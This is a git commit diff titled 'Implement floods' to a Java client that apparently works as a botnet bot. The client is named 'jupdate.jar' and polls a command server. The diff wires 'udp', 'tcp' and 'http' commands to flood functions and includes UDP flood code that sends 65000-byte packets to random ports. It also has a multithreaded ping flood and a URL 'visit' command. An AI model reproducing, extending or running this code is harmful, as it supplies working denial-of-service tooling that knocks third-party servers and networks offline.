ec4e4196fb6ce2d37ad0fb401e70358424b3cfd4
thecarterb <cbawsome77@gmail.com>
2017-05-06 16:51:40 -0400

    Implement floods

--- SoraClient/com/am77/Client.java
+++ SoraClient/com/am77/Client.java
@@ -1,17 +1,7 @@
 package com.am77;
 
-import java.io.BufferedInputStream;
-import java.io.BufferedOutputStream;
-import java.io.BufferedReader;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.FileWriter;
-import java.io.IOException;
-import java.io.InputStream;
-import java.io.InputStreamReader;
-import java.io.OutputStream;
-import java.io.PrintWriter;
+import java.io.*;
+import java.math.BigInteger;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.HttpURLConnection;
@@ -22,6 +12,9 @@ import java.net.Socket;
 import java.net.SocketException;
 import java.net.URL;
 
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
+import java.util.zip.Inflater;
 
 import com.am77.extern.HttpRequest;
 import com.am77.extern.RegistryUtils;
@@ -32,7 +25,7 @@ public class Client {
 
     public static String filename = "jupdate.jar";
     public static boolean debug = true;  // Change this to false on release
-    public int packSize = 65000;
+    public static int packSize = 65000;
 
 
     public static void main(String[] args) throws InterruptedException{
@@ -55,21 +48,34 @@ public class Client {
               /*
                Parse the response here
               */
+                String[] splitBody = body.split(" ");
+                try {
+                    if (body.equals("NONE")) {
+                        debug("Got a none, waiting 3 seconds.");
+                        Thread.sleep(3000);
 
-                if (body.equals("NONE")) {
-                    debug("Got a none, waiting 3 seconds.");
-                    Thread.sleep(3000);
-                } else if (body.startsWith("udp")) {
-                    debug("UDP ATTACK");
-                } else if (body.startsWith("tcp")) {
-                    debug("TCP ATTACK");
-                } else if (body.startsWith("http")) {
-                    debug("HTTP ATTACK");
-                } else if (body.startswith("visit"){
-                    String[] split = body.split(" ");
-                    debug("VISIT " + split[1])
-                }else {
-                    debug("Got an unknown command: " + body);
+                    } else if (body.startsWith("udp") && splitBody.length == 3) {
+                        debug(body);
+                        udpFlood(splitBody[1], Long.parseLong(splitBody[2]));
+
+                    } else if (body.startsWith("tcp") && splitBody.length == 5) {
+                        debug(body);
+                        tcpFlood(splitBody[1], Integer.parseInt(splitBody[2]), Integer.parseInt(splitBody[4]), Long.parseLong(splitBody[3]));
+
+                    } else if (body.startsWith("http") && splitBody.length == 3) {
+                        debug(body);
+                        httpFlood(splitBody[1], Long.parseLong(splitBody[2]));
+
+                    } else if (body.startsWith("visit")) {
+                        debug(body);
+                        visit(new URL(splitBody[1]));
+
+                    } else {
+                        debug("Got an unknown command: " + body);
+                    }
+                } catch (Exception ioe){
+                    debug("Couldn't perform action :(");
+                    ioe.printStackTrace();
                 }
 
             } catch (HttpRequest.HttpRequestException hre){
@@ -81,14 +87,15 @@ public class Client {
 
 
 /*
-     ______ _                 _
-    |  ____| |               | |
-   | |__  | | ___   ___   __| |___
-  |  __| | |/ _ \ / _ \ / _` / __|
- | |    | | (_) | (_) | (_| \__ \
+ ______ _                 _
+|  ____| |               | |
+| |__  | | ___   ___   __| |___
+|  __| | |/ _ \ / _ \ / _` / __|
+| |    | | (_) | (_) | (_| \__ \
 |_|    |_|\___/ \___/ \__,_|___/
+
 */
-    public static void udpFlood(String host, final long duration){
+    public static void udpFlood(String host, final long duration) throws Exception{
       final String target = resolve(host);
        new Thread(new Runnable() {
 
@@ -98,7 +105,7 @@ public class Client {
                    DatagramSocket udpSocket = new DatagramSocket();
                    while (System.currentTimeMillis() < endTime) {
                        byte[] data = new byte[65000];
-                       data = fillPack.getBytes();
+                       data = fillPack().getBytes();
                        try {
                            udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(target), (int) (Math.random() * 65534) + 1));
                        } catch (IOException ioe) {
@@ -147,34 +154,36 @@ public class Client {
         }).start();
     }
 
-    public static void pingOD(String host, final long duration, int thread){
-      final String target = resolve(host);
-      for (int i = 0; i < thread; i++) {
-          new Thread(new Runnable() {
+    // TODO DONT FORGET TO IMPLEMENT THIS
+    public static void pingOD(final String host, final long duration, int thread) throws Exception {
+        final String target = resolve(host);
+        for (int i = 0; i < thread; i++) {
+            new Thread(new Runnable() {
 
-              public void run() {
-                  try {
-                      long endTime = System.currentTimeMillis() + duration;
-                      InetAddress addr = InetAddress.getByName(host);
-                      while (System.currentTimeMillis() < endTime) {
-                          addr.isReachable(5)  // Sends a ping to the target (5 sec timeout)
-                      }
-                  } catch (Exception e) {
-                      e.printStackTrace();
-                  }
-              }
-          }).start();
+                public void run() {
+                    try {
+                        long endTime = System.currentTimeMillis() + duration;
+                        InetAddress addr = InetAddress.getByName(host);
+                        while (System.currentTimeMillis() < endTime) {
+                            addr.isReachable(5);  // Sends a ping to the target (5 sec timeout)
+                        }
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }).start();
+        }
     }
 
 /*
-     ____  __  __
+    ____  __  __
    / __ \/ /_/ /_  ___  _____
   / / / / __/ __ \/ _ \/ ___/
  / /_/ / /_/ / / /  __/ /
-\____/\__/_/ /_/\___/_/
+ \____/\__/_/ /_/\___/_/
 
 */
-    private void visit(final URL url) throws Exception {
+    private static void visit(final URL url) throws Exception {
         new Thread(new Runnable() {
             public void run() {
                 try {
@@ -217,7 +226,7 @@ public class Client {
         }
         return InetAddress.getByName(url.getHost()).getHostAddress();
     }
-  }
+
 
   public static String fillPack(){
     String result = "";
@@ -226,4 +235,5 @@ public class Client {
     }
     return result;
   }
+
 }
